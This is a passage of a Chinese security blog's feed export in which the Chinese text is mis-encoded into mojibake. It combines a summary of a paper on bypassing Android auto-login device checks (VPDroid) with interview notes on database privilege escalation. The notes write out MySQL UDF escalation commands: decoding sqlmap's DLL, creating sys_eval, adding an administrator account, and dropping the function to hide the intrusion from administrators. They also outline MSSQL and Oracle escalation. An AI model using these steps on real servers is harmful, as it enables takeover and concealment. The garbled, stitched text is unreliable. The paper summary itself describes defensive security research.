´ç™»å½•è®¾å¤‡æ•°é‡é™åˆ¶æˆ–ç§˜å¯†ç™»å½•å—å®³è€…çš„å¸æˆ·ï¼Œä»è€ŒæŸå®³APPè¿è¥è€…çš„åˆæ³•æƒç›Šæˆ–ä¾µçŠ¯ç”¨æˆ·éšç§å’Œæ•°æ®å®‰å…¨ã€‚å¯¹æ­¤ï¼Œä¸šç•Œæå‡ºäº†è®¾å¤‡ä¸€è‡´æ€§æ£€æŸ¥æ–¹æ¡ˆï¼Œåªè¦å‘ç°APPè¿è¡Œè®¾å¤‡ç¯å¢ƒå‘ç”Ÿå˜åŒ–ï¼ŒAPPå°†ç¦æ­¢è‡ªåŠ¨ç™»å½•è¿›è€Œé˜»æ­¢å…‹éš†æ”»å‡»ã€‚é’ˆå¯¹è¯¥é—®é¢˜ï¼Œæœ¬æ–‡è¿›ä¸€æ­¥ç ”ç©¶å‘ç°è¯¥æ–¹æ¡ˆæ— æ³•å®Œå…¨é˜²å¾¡â€œdata-clone attackâ€ã€‚è¯¥å›¢é˜Ÿæå‡ºäº†ä¸€ä¸ªå…·æœ‰è‰¯å¥½é€æ˜æ€§çš„è™šæ‹ŸåŒ–æ–¹æ¡ˆVPDroidï¼Œ å¯å®šåˆ¶æ”»å‡»æ‰€éœ€çš„è®¾å¤‡ç¯å¢ƒï¼Œä»¥è¿›è¡ŒAppè‡ªåŠ¨ç™»å½•çš„å®‰å…¨æµ‹è¯•ã€‚è¯¥ç ”ç©¶å¯¹åº”ç”¨å¸‚åœºä¸­234ä¸ªä¸»æµAPPè¿›è¡Œäº†æµ‹è¯•ï¼Œç»“æœè¡¨æ˜ï¼Œé€šè¿‡VPDroidå¯æœ‰æ•ˆç»•è¿‡è¢«æµ‹APPçš„ä¸€è‡´æ€§æ£€æŸ¥æœºåˆ¶ã€‚åœ¨è¯¥æˆæœçš„ç ”ç©¶è¿‡ç¨‹ä¸­ï¼Œè¯¥å›¢é˜Ÿå‘ç°äº†ç³»åˆ—å®‰å…¨æ¼æ´ï¼Œè¿‘20ä¸ªå‚å•†å¯¹æäº¤çš„æ¼æ´ç»™äºˆäº†ç¡®è®¤ï¼ˆå…¶ä¸­åŒ…æ‹¬1ä¸ªCVEå’Œè¿‘10é¡¹CNVDæ¼æ´æˆæœï¼‰ã€‚</p><p>å…·ä½“ä»€ä¹ˆæ˜¯è‡ªåŠ¨ç™»å½•å‘¢ï¼Œå¦‚ä¸‹å›¾æ˜¯æˆ‘åœ¨ä½œè€…çš„å¦ä¸€ç¯‡è®ºæ–‡ä¸­æ‰¾åˆ°çš„å›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰å·²æœ‰è®¾å¤‡ç™»å½•è´¦å·ï¼Œåœ¨å¦ä¸€æ‰‹æœºç™»é™†æ—¶ä¼šå¼¹å‡ºä»…èƒ½ç™»å½•ä¸€ä¸ªè®¾å¤‡çš„æç¤ºã€‚åœ¨å®‰å“æ‰‹æœºä¸­ï¼Œappé€šå¸¸ä½¿ç”¨ç”¨æˆ·ç™»å½•å‡­è¯æ¥å®ç°è‡ªåŠ¨ç™»å½•ï¼Œåœ¨é¦–æ¬¡ç™»å½•æˆåŠŸä¹‹åï¼Œappå°†å‡­è¯æ•°æ®ä¿å­˜åœ¨æœ¬åœ°å­˜å‚¨å½“ä¸­ï¼Œä¸‹æ¬¡ç™»é™†å‰è¿›è¡ŒéªŒè¯ï¼Œå®‰å“æä¾›äº†å››ç§å­˜å‚¨æœºåˆ¶åŒ…æ‹¬å†…éƒ¨å­˜å‚¨ã€å¤–éƒ¨å­˜å‚¨ã€å…±äº«å­˜å‚¨ã€æ•°æ®åº“å­˜å‚¨ã€‚ç›¸åº”çš„appæ•°æ®ä¼šå­˜å‚¨åœ¨å¯¹åº”è·¯å¾„å½“ä¸­ï¼Œä¸€èˆ¬å…¶å®ƒçš„åº”ç”¨æ˜¯æ— æ³•è®¿é—®çš„ã€‚è¦å®ç°å…‹éš†çš„è¯ä¸ä»…éœ€è¦å…‹éš†åº”ç”¨æœ¬èº«èµ„æºï¼Œä¸ºäº†é˜²æ­¢è¿™æ ·çš„å…‹éš†è¡Œä¸ºï¼Œä¸šç•Œçš„è§£å†³æ–¹æ¡ˆæ˜¯æ£€æŸ¥è®¾å¤‡ä¸€è‡´æ€§ï¼Œå¦‚è®¾å¤‡ç”µè¯å·ã€åºåˆ—å·ç­‰ä¿¡æ¯ï¼Œæ­¤ç±»è¡Œä¸ºå¯èƒ½å¯ä»¥ä½¿ç”¨Xposedç­‰æ¡†æ¶hookç›¸å…³å‡½æ•°è¿›è¡Œç»•è¿‡ï¼Œä½†å¾ˆå¤šappä¹Ÿä¼šæœ‰åè°ƒè¯•æªæ–½ï¼Œè€Œä¸”ä¹‹å‰çš„ç›¸å…³å·¥ä½œå½“ä¸­ä»…hookäº†13ä¸ªç›¸å…³çš„æ ‡è¯†ä¿¡æ¯ï¼Œä½†æœ¬æ–‡é€šè¿‡è°ƒç ”å‘ç°äº†103ä¸ªæœ‰å…³è®¾å¤‡æ ‡è¯†çš„ä¿¡æ¯ã€‚</p><p>æœ¬æ–‡é€šè¿‡å®šåˆ¶äº†ä¸€ä¸ªå®‰å“è™šæ‹Ÿæœºç³»ç»Ÿæ¥å®ç°äº†å¯¹è®¾å¤‡æ ‡è¯†çš„å®šåˆ¶åŒ–ä¿®æ”¹ï¼Œè¯¥ä¿®æ”¹å¯¹äºappæ¥è¯´æ˜¯é€æ˜çš„ã€‚Cellsæ˜¯ä¸€ä¸ªè½»é‡çš„å®‰å“è™šæ‹Ÿæœºç³»ç»Ÿï¼Œå¯ä»¥ç›´æ¥ä¸ç¡¬ä»¶è¿›è¡Œäº¤äº’ï¼Œä»–çš„ä¸»è¦æœºåˆ¶æ˜¯åˆ›å»ºäº†ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿæœºå‘½åç©ºé—´ï¼Œä»¥æ­¤å®ç°åŒçœŸæœºç³»ç»Ÿçš„éš”ç¦»ï¼Œä»¥åŠä¸åŒç³»ç»Ÿé—´çš„éš”ç¦»ï¼Œä½†æ˜¯Cellsä¹Ÿæœ‰å¾ˆå¤šå±€é™æ€§ï¼Œå®ƒçš„çµæ´»æ€§å¼±ï¼Œå¯¹æ–°ç‰ˆæœ¬çš„å®‰å“ç³»ç»Ÿå¹¶ä¸æ”¯æŒï¼ŒåŒæ—¶ç¼ºå°‘å¯¹è“ç‰™ã€GPSç­‰è®¾å¤‡çš„æ”¯æŒï¼Œè€Œä¸”å¯¹äºappæ¥è¯´ï¼Œå¯ä»¥å‘ç°Cellsè™šæ‹Ÿæœºçš„æŒ‡çº¹ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥å‘ç°å½“å‰è®¾å¤‡æ˜¯è™šæ‹Ÿæœºã€‚</p><p>æœ¬æ–‡åœ¨Cellsçš„åŸºç¡€ä¸Šè¿›è¡Œå®šåˆ¶åŒ–ï¼Œä¸ºäº†å®ç°å¯¹appå…‹éš†çš„æ”»å‡»æ¨¡å‹ï¼Œè™šæ‹Ÿæœºéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ç‚¹æ˜¯éœ€è¦ç›´æ¥èƒ½å¤Ÿæ¥è§¦åˆ°ç¡¬ä»¶ï¼Œç¬¬äºŒç‚¹æ˜¯å¯ä»¥å®šåˆ¶åŒ–ç³»ç»Ÿå‚æ•°å¹¶ä¸”å¯¹appè€Œè¨€è¯¥æ“ä½œæ˜¯é€æ˜çš„ã€‚ä¸ºäº†å®ç°è¿™äº›ç›®æ ‡ï¼Œæœ¬æ–‡ä¸»è¦é‡‡å–ä¸¤ä¸ªæ–¹å¼ï¼Œé¦–å…ˆæ˜¯é’ˆå¯¹åœ¨å®‰å“ServiceManagerä¸­å®šä¹‰çš„æœåŠ¡ï¼Œé‡‡ç”¨binderæœºåˆ¶è¿›è¡Œé€šä¿¡ï¼Œbinderæœºåˆ¶æ˜¯å®‰å“ç³»ç»Ÿå¼•å…¥çš„è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æœºåˆ¶ã€‚ç¬¬äºŒç§æ–¹æ³•æ˜¯ï¼Œå¯¹äºæ²¡æœ‰åœ¨ServiceManagerä¸­å®šä¹‰çš„æœåŠ¡ï¼Œé‡‡ç”¨å’ŒçœŸæœºäº¤äº’çš„æ–¹å¼ï¼Œè®¾ç½®é€šä¿¡ä»£ç†ã€‚ï¼ˆRILæ˜¯ä¸€ç§å’Œç”µè¯è¿è¥å•†ç½‘ç»œäº¤äº’çš„åŠŸèƒ½æ¥å£ï¼ŒRILDæ˜¯åœ¨C++å±‚çš„æ¥å£ï¼‰</p><p>VPDroidç³»ç»Ÿæ•´ä½“æ¦‚å†µå›¾å¦‚å›¾æ‰€ç¤ºï¼Œè™šæ‹Ÿå‡ºçš„å®‰å“è®¾å¤‡ç‹¬ç«‹äºä¸»æœºï¼Œå¹¶å¯å®ç°å…¶ä¸­çš„å‚æ•°å®šåˆ¶ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆå…·ä½“å®ç°å‚æ•°å®šåˆ¶åŒ–å‘¢ï¼ŒVPDroidæä¾›äº†ä¸€ä¸ªå®šåˆ¶æ–‡ä»¶ï¼Œä¿®æ”¹å…¶ä¸­çš„æ–‡ä»¶ä¿¡æ¯ä¾¿å¯å®ç°å®šåˆ¶ï¼Œå¯¹äºå®‰å“ç³»ç»Ÿçš„å‚æ•°ä¿¡æ¯ï¼Œåªéœ€è¦å°†å…¶ä¸­å®šåˆ¶ä¿¡æ¯åˆå§‹åŒ–åœ¨è™šæ‹Ÿæœºå†…å­˜ä¸­å³å¯ï¼Œå¯¹äºç”¨æˆ·å±‚å’Œå†…æ ¸å±‚çš„å®šåˆ¶åŒ–ï¼Œåˆ™éœ€è¦å°†å…¶åˆå§‹åŒ–åœ¨çœŸæœºå†…å­˜ä¸­ã€‚</p><p>æœ¬æ–‡é‡‡ç”¨äº†åº”ç”¨å•†åº—æ’åé å‰çš„234ä¸ªåº”ç”¨è¿›è¡Œå®éªŒï¼Œåœ¨VPDroidä¸­æ‰€æœ‰appéƒ½èƒ½å®ç°ç»•è¿‡ï¼Œä½œè€…ä¹Ÿæå‡ºäº†å»ºè®®ï¼Œä¸è¦å°†è®¤è¯å‡­è¯ä¿å­˜åœ¨æœ¬åœ°ã€æˆ–è€…é‡‡ç”¨å¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼Œä½†è¿™æ ·çš„å¼€é”€ä¹Ÿä¼šåŠ å¤§ï¼Œå½±å“ç”¨æˆ·ä½“éªŒï¼Œæœ¬æ–‡æœ€åä¹ŸæŒ‡å‡ºäº†VPDroidå¯¹äºç»rootçš„ç”¨æˆ·æ¥è¯´è¿˜ä¸æ˜¯é€æ˜çš„ï¼Œå› ä¸ºåœ¨é‡‡ç”¨ä»£ç†é€šä¿¡æ—¶ï¼ŒVPDroidå¹¶æœªç›´æ¥ä¸RILDé€šä¿¡ï¼Œä¹Ÿå­˜åœ¨æœ‰ç›¸åº”çš„æŒ‡çº¹ä¿¡æ¯ã€‚</p><h2 id="Professional-term"><a href="#Professional-term" class="headerlink" title="Professional term"></a>Professional term</h2><ul><li>original equipment manufacturer (OEM)ï¼ˆåŸå§‹è®¾å¤‡ç”Ÿäº§å•†ï¼‰ï¼š</li><li>appå…‹éš†ï¼šæ·±å…¥æŒ–æ˜APPå…‹éš†å®éªŒ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· Android æ‰‹æœºå…‹éš†&#x2F;ä¸€é”®æ¢æœºåŸç†åˆæ¢_ITå…ˆæ£®çš„åšå®¢-CSDNåšå®¢_æ‰‹æœºå…‹éš†åŸç†</li><li>Binderï¼šå®‰å“ä¸­è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æœºåˆ¶ SourceAnalysis-1&#x2F;Binderæºç åˆ†æ.md at master Â· VPDroid&#x2F;SourceAnalysis-1 (github.com)</li><li>SELinuxï¼šSELinux å±äºMACçš„å…·ä½“å®ç°ï¼Œå¢å¼ºäº†Linuxç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚MACæœºåˆ¶çš„ç‰¹ç‚¹åœ¨äºï¼Œèµ„æºçš„æ‹¥æœ‰è€…ï¼Œå¹¶ä¸èƒ½å†³å®šè°å¯ä»¥æ¥å…¥åˆ°èµ„æºã€‚å…·ä½“å†³å®šæ˜¯å¦å¯ä»¥æ¥å…¥åˆ°èµ„æºï¼Œæ˜¯åŸºäºå®‰å…¨ç­–ç•¥ã€‚è€Œå®‰å…¨ç­–ç•¥åˆ™æ˜¯æœ‰ä¸€ç³»åˆ—çš„æ¥å…¥è§„åˆ™ç»„æˆï¼Œå¹¶ä»…æœ‰ç‰¹å®šæƒé™çš„ç”¨æˆ·æœ‰æƒé™æ“ä½œå®‰å…¨ç­–ç•¥</li><li>Android RILæ¦‚è¿°ï¼šå’Œç”µè¯è¿è¥å•†ç½‘ç»œäº¤äº’çš„åŠŸèƒ½æ¥å£Android RILæ¦‚è¿°-CSDNåšå®¢</li></ul><h2 id="Thesaurus"><a href="#Thesaurus" class="headerlink" title="Thesaurus"></a>Thesaurus</h2><ul><li>client-side tampering vulnerabilitiesï¼ˆå®¢æˆ·ç«¯ç¯¡æ”¹æ¼æ´ï¼‰ï¼šIn this paper, we focus on the security risk caused by mobile appsâ€™ auto-login functions, which belongs to client-side tampering vulnerabilities.</li><li>hassleï¼ˆéº»çƒ¦ï¼‰ï¼šIt avoids the hassle of retyping user ID and password in a small keyboard when reaccessing the app.</li><li>In a nutshellï¼ˆç®€è€Œè¨€ä¹‹ï¼‰ï¼šIn a nutshell, we make the following three significant contributions.</li><li>backendsï¼ˆåç«¯ï¼‰ï¼šThey exploit an entire class of apps that only rely on device-public information to authenticate the user to their backends.</li><li>seamlesslyï¼ˆæ— ç¼åœ°ï¼‰ï¼šFor example, Smart Switch can seamlessly transfer app private data and home layouts between Galaxy devices, and it is similar for other OEM-made clone apps.</li><li>jeopardyï¼ˆå±é™©ï¼‰ï¼šAs a result, the userâ€™s sensitive data will be in jeopardy without raising suspicion.</li><li>citationï¼ˆå¼•æ–‡ï¼‰ï¼šThe citation [19] provides more details to advocate the subscription-based app economy. For the smart home apps, we also purchase related smart home devices, including one smart lock, two security - cameras, and one smart light bulb, to test whether we can control them after launching a data-clone attack.</li><li>imperceptibleï¼ˆå¯Ÿè§‰ä¸åˆ°çš„ï¼‰ï¼šUser-mode apps in the VP are imperceptible to the change of device; this requires our virtualization and device-attribute customization functions are invisible to user-mode apps running in - the VP.</li><li>proprietaryï¼ˆç‰¹æœ‰çš„ï¼Œä¸“æœ‰çš„ï¼‰ï¼šsome hardware vendors provide proprietary software</li><li>pseudoï¼ˆå‡çš„ï¼‰ï¼šThe Binder driver is a custom pseudo driver with no corresponding physical device.</li><li>To the best of our knowledgeï¼ˆæ®æˆ‘ä»¬æ‰€çŸ¥ï¼‰ï¼šTo the best of our knowledge, VPDroid offers the most comprehensive Android device-attribute editing options so far.</li></ul><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>GitHub - VPDroid&#x2F;Dev: VPDroid is a lightweight Android OS-level virtualization architecture</p><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é‡è¦é¢ç»ï¼</title>
      <link href="/2024/03/26/work/workpreview/"/>
      <url>/2024/03/26/work/workpreview/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°æ®åº“ææƒå†™shellæ–¹å¼"><a href="#æ•°æ®åº“ææƒå†™shellæ–¹å¼" class="headerlink" title="æ•°æ®åº“ææƒå†™shellæ–¹å¼"></a>æ•°æ®åº“ææƒå†™shellæ–¹å¼</h2><p><a href="https://developer.aliyun.com/article/1225524">https://developer.aliyun.com/article/1225524</a></p><h3 id="MySQL-ææƒ"><a href="#MySQL-ææƒ" class="headerlink" title="MySQL ææƒ"></a>MySQL ææƒ</h3><ul><li><p><strong>CVE-2012-2122 æ¼æ´åˆ©ç”¨</strong>ï¼š</p><ul><li>ç¡®è®¤ç›®æ ‡ MySQL ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼ˆMariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23ï¼›MySQL versions from 5.1.63, 5.5.24, 5.6.6 ä¹‹å‰ï¼‰ã€‚</li><li>ä½¿ç”¨ msf æ¨¡å— <code>auxiliary/scanner/mysql/mysql_authbypass_hashdump</code> æˆ– bash å¾ªç¯ä¸æ–­å°è¯•è¿æ¥ MySQL æ•°æ®åº“ï¼Œåˆ©ç”¨æ¼æ´ç»•è¿‡å¯†ç éªŒè¯è·å– root æƒé™ã€‚</li></ul></li><li><p><strong>Webshell æƒé™æå‡</strong>ï¼š</p><ul><li>ç¡®è®¤æ»¡è¶³å†™ shell æ¡ä»¶ï¼šçŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„ã€é«˜æƒé™æ•°æ®åº“ç”¨æˆ·ã€load_file() å¼€å¯ï¼ˆsecure_file_priv æ— é™åˆ¶ï¼‰ã€ç½‘ç«™è·¯å¾„æœ‰å†™å…¥æƒé™ã€‚</li><li>æŸ¥çœ‹ secure_file_priv æ˜¯å¦æœ‰é™åˆ¶ï¼Œè‹¥ä¸º NULL åˆ™éœ€ä¿®æ”¹ä¸º â€œâ€ å¹¶é‡å¯æœåŠ¡å™¨ã€‚</li><li>é€šè¿‡ phpmyadmin æˆ– sqlmap æ‰§è¡Œ SQL å‘½ä»¤ï¼Œå°† shell å†™å…¥ç½‘ç«™ç›®å½•ï¼Œå†åˆ©ç”¨å·¥å…·è¿æ¥è·å–æƒé™ã€‚</li></ul>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();   # è·å–æ•°æ®åº“ç‰ˆæœ¬</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();  # è·å–æ•°æ®åº“ç”¨æˆ·</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>;   # è·å–æ•°æ®åº“å®‰è£…ç›®å½•</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> â€˜<span class="operator">%</span>plugin<span class="operator">%</span>â€™; # æŸ¥çœ‹pluginè·¯å¾„ã€‚</span><br></pre></td></tr></table></figure></li><li><p><strong>æ—¥å¿—å†™ shell ææƒ</strong>ï¼š</p><ul><li>ç¡®è®¤ MySQL ç‰ˆæœ¬ 5.0 ä»¥ä¸Šä¸” general_log é»˜è®¤å…³é—­ã€‚<blockquote><p>åœ¨sqlmap&#x2F;data&#x2F;udf&#x2F;mysqlç›®å½•ä¸‹ï¼Œåœ¨Windowsç›®å½•ä¸­æœ‰32ä½å’Œ64ä½çš„dllæ–‡ä»¶ï¼ˆMySQLä½æ•°ï¼‰ã€‚<br>æ–‡ä»¶å¤¹ä¸­çš„dllæ–‡ä»¶æ˜¯é€šè¿‡å¼‚æˆ–ç¼–ç çš„ï¼Œå¯ä»¥ä½¿ç”¨sqlmap&#x2F;extract&#x2F;cloak.pyè¿›è¡Œè§£ç <br>python &#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py -d -i &#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_<br>å°†è§£ç åçš„DLLæ–‡ä»¶ï¼ˆåŒ…å«ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„DLLæ–‡ä»¶ï¼‰ä¸Šä¼ åˆ°å¯å†™ç›®å½•ï¼Œå†å¯¼å…¥åˆ°MySQL\lib\plugin\ä¸­<br>select LOAD_FILE(â€˜C:&#x2F;å¯å†™ç›®å½•&#x2F;lib_mysqludf_sys.dllâ€™) into dumpfile â€˜C:&#x2F;phpStudy2016&#x2F;MySQL&#x2F;lib&#x2F;plugin&#x2F;&gt; lib_mysqludf_sys.dllâ€™;<br>å°†DLLä¸­çš„å‡½æ•°å¼•å…¥åˆ°MySQLæ•°æ®åº“ä¸­<br>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°<br>create function sys_eval returns string soname â€˜lib_mysqludf_sys.dllâ€™;<br>åˆ›å»ºåä¸ºsys_evalçš„å‡½æ•°ï¼Œè¿”å›å€¼ä¸ºstringç±»å‹ï¼Œè°ƒç”¨çš„æ–‡ä»¶æ˜¯lib_mysqludf_sys.dll<br>æ³¨æ„ï¼šéœ€è¦åˆ›å»º.dllæ–‡ä»¶ä¸­å­˜åœ¨çš„å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€.dllæ–‡ä»¶ï¼ŒæŸ¥çœ‹å¯ä»¥è¢«åˆ›å»ºçš„å‡½æ•°ã€‚<br>ä½¿ç”¨è¯¥å‡½æ•°å»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ææƒ<br>æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™<br>select sys_eval(â€œwhoamiâ€);<br>åˆ›å»ºè´¦å·å¹¶æå‡ä¸ºç®¡ç†å‘˜æƒé™<br>select sys_eval(â€œnet user winhex passw@ord &#x2F;addâ€);<br>select sys_eval(â€œnet localgroup administrators winhex &#x2F;addâ€);<br>å°†ä¹‹å‰å¼•å…¥çš„å‡½æ•°åˆ é™¤æ‰<br>é˜²æ­¢è¢«ç®¡ç†å‘˜å‘ç°ï¼Œé˜²æ­¢å…¶ä»–æ”»å‡»è€…ä½¿ç”¨<br>drop function sys_eval;<br>delete from mysql.func where name&#x3D;â€™sys_evalâ€™;</p></blockquote></li><li>å¼€å¯ general_logï¼Œä¿®æ”¹ general_log_file è·¯å¾„ä¸ºç½‘ç«™ç›®å½•ä¸‹çš„æ–‡ä»¶åã€‚</li><li>å†™å…¥ shell å†…å®¹ï¼Œåˆ©ç”¨å·¥å…·è¿æ¥è·å–æƒé™ã€‚</li></ul></li></ul><p>Linux UDFææƒï¼š<a href="https://www.freebuf.com/articles/web/264790.html">https://www.freebuf.com/articles/web/264790.html</a></p><ul><li><p><strong>UDF ææƒ</strong>ï¼š</p><ul><li>åˆ¤æ–­ MySQL ç‰ˆæœ¬ï¼Œé€‰æ‹©å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“ä½ç½®ã€‚</li><li>å°† sqlmap ä¸­çš„åŠ¨æ€é“¾æ¥åº“è§£ç åä¸Šä¼ åˆ° MySQL ç‰¹å®šç›®å½•ï¼ˆæ ¹æ®ç‰ˆæœ¬é€‰æ‹©ç›®å½•ï¼‰ã€‚</li><li>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œåˆ©ç”¨è¯¥å‡½æ•°æ‰§è¡Œå‘½ä»¤å®ç°ææƒï¼Œæœ€åå¯åˆ é™¤è‡ªå®šä¹‰å‡½æ•°æ¸…ç†ç—•è¿¹ã€‚</li></ul></li><li><p><strong>MOF ææƒ</strong>ï¼š</p><ul><li>ç¡®è®¤ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ä¸º 2003 æˆ–ä¹‹å‰ï¼Œåˆ©ç”¨ mof æ–‡ä»¶æ¯äº”ç§’æ‰§è¡Œä¸”ä¸ºç³»ç»Ÿæƒé™çš„ç‰¹ç‚¹ã€‚</li><li>å°†åŒ…å« vbs è„šæœ¬çš„ mof æ–‡ä»¶é€šè¿‡ mysql çš„ load_file å†™å…¥æŒ‡å®šç›®å½•ï¼Œç­‰å¾…æ‰§è¡Œåˆ›å»ºç”¨æˆ·å®ç°ææƒï¼Œæ¸…ç†ç—•è¿¹éœ€åœæ­¢æœåŠ¡ã€åˆ é™¤ç›¸å…³æ–‡ä»¶å¹¶é‡å¯æœåŠ¡ã€‚</li></ul></li><li><p><strong>å¯åŠ¨é¡¹ææƒ</strong>ï¼š</p><ul><li>ç¡®è®¤ç³»ç»Ÿå¯åŠ¨é¡¹è·¯å¾„ï¼Œæ ¹æ®ç³»ç»Ÿç‰ˆæœ¬é€‰æ‹©å¯¹åº”è·¯å¾„ã€‚</li><li>åœ¨ mysql ä¸­åˆ›å»ºè¡¨å¹¶æ’å…¥åˆ›å»ºç”¨æˆ·å’Œæ·»åŠ ç®¡ç†å‘˜æƒé™çš„ vbs è„šæœ¬å†…å®¹ï¼Œå°†è„šæœ¬å†™å…¥å¯åŠ¨é¡¹è·¯å¾„ï¼Œé‡å¯åè„šæœ¬æ‰§è¡Œå®ç°ææƒã€‚</li></ul></li><li><p><strong>CVE-2016-6663ã€CVE-2016-6664 ç»„åˆææƒ</strong>ï¼š</p><ul><li>å¯¹äº Mysql å°äºç‰¹å®šç‰ˆæœ¬çš„æƒ…å†µï¼Œå…ˆåˆ©ç”¨ CVE-2016-6663 å°† www-data æƒé™æå‡ä¸º mysql æƒé™ï¼Œå†åˆ©ç”¨ CVE-2016-6664 å°† Mysql æƒé™æå‡ä¸º root æƒé™ã€‚</li></ul></li></ul><h3 id="MSSQL-ææƒ"><a href="#MSSQL-ææƒ" class="headerlink" title="MSSQL ææƒ"></a>MSSQL ææƒ</h3><ul><li><p><strong>xp_cmdshell ææƒ</strong>ï¼š</p><ul><li>å¼€å¯ xp_cmdshellï¼Œåˆ©ç”¨å…¶æ‰§è¡Œå‘½ä»¤å®ç°ææƒï¼Œå¦‚æ·»åŠ ç”¨æˆ·ã€æ›¿æ¢ç²˜è´´é”®ã€ä¼ é©¬ç­‰æ“ä½œï¼Œå®Œæˆåå¯å…³é—­ xp_cmdshell æ¸…ç†ç—•è¿¹ã€‚</li></ul></li><li><p><strong>sp_OACreate ææƒ</strong>ï¼š</p><ul><li>å¼€å¯ Ole Automation Proceduresï¼Œåˆ©ç”¨ sp_OACreate æ‰§è¡Œå‘½ä»¤å®ç°ææƒï¼Œå¦‚ç›´æ¥åŠ ç”¨æˆ·ã€ç²˜è´´é”®æ›¿æ¢ã€ç›´æ¥ä¼ é©¬ã€å¯åŠ¨é¡¹å†™å…¥åŠ è´¦æˆ·è„šæœ¬ç­‰æ“ä½œã€‚</li></ul></li><li><p><strong>æ²™ç›’ææƒ</strong>ï¼š</p><ul><li>å¼€å¯é»˜è®¤å…³é—­çš„ xp_regwrite å­˜å‚¨è¿‡ç¨‹ï¼Œåˆ©ç”¨ jet.oledb æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ·»åŠ ç³»ç»Ÿè´¦å·å®ç°ææƒã€‚</li></ul></li></ul><h3 id="Oracle-ææƒ"><a href="#Oracle-ææƒ" class="headerlink" title="Oracle ææƒ"></a>Oracle ææƒ</h3><ul><li><p><strong>é€šè¿‡æ³¨å…¥å­˜å‚¨è¿‡ç¨‹ææƒ</strong>ï¼š</p><ul><li>æ‰‹å·¥æ³¨å…¥ï¼šç”¨æˆ·ç™»å½•åæŸ¥çœ‹æƒé™ï¼Œåˆ›å»ºææƒå‡½æ•°å¹¶æ³¨å…¥åˆ°å­˜åœ¨ sql æ³¨å…¥çš„å­˜å‚¨è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œå‘½ä»¤æå‡æƒé™ã€‚</li><li>åˆ©ç”¨ MSF æ³¨å…¥ï¼šåŠ è½½æ”»å‡»æ¨¡å—ï¼Œé…ç½®å‚æ•°åè¿è¡Œå®ç°ææƒã€‚</li></ul></li><li><p><strong>é€šè¿‡ utl_http.request å­˜å‚¨è¿‡ç¨‹ææƒ</strong>ï¼š</p><ul><li>åˆ›å»º Java åŒ…å’Œå­˜å‚¨è¿‡ç¨‹ MYJAVACMDï¼Œæ‰§è¡Œè¯¥å­˜å‚¨è¿‡ç¨‹å®ç°ææƒã€‚</li></ul></li></ul><h2 id="åº”æ€¥å“åº”æµç¨‹"><a href="#åº”æ€¥å“åº”æµç¨‹" class="headerlink" title="åº”æ€¥å“åº”æµç¨‹"></a>åº”æ€¥å“åº”æµç¨‹</h2><ol><li>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯</li></ol><ul><li>æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ï¼š<code>cat /etc/passwd</code></li><li>æŸ¥çœ‹å½±å­æ–‡ä»¶ï¼š<code>cat /etc/shadow</code></li><li>æŸ¥çœ‹ç‰¹æƒè´¦æˆ·ï¼ˆUIDä¸º0ï¼‰ï¼š<code>awk -F: &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd</code> æˆ– <code>cat /etc/passwd | grep x:0</code></li><li>æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·åŠå…¶ç™»å½•IPï¼š<code>who</code></li><li>æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·åŠå…¶æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºï¼š<code>w</code></li><li>æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½ã€ç™»å½•ç”¨æˆ·æ•°ç­‰ä¿¡æ¯ï¼š<code>uptime</code></li><li>æŸ¥çœ‹å¯†ç æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ï¼š<code>stat /etc/passwd</code></li><li>æŸ¥çœ‹é™¤ä¸å¯ç™»å½•ç”¨æˆ·å¤–çš„å…¶ä»–ç”¨æˆ·ï¼š<code>cat /etc/passwd | grep -v nologin</code></li><li>æŸ¥çœ‹èƒ½ç”¨bash 